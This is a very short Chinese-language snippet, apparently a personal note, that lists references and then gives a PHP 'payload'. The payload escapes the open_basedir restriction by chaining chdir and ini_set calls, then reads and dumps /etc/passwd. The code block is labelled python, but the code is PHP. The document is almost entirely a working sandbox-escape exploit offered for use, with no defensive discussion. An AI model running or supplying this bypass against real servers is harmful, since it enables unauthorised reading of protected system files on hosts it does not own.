参考：
- twitter
- https://xz.aliyun.com/t/4720

payload
```python
<?php
chdir('subDir');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
$a=file_get_contents('/etc/passwd');
var_dump($a);
```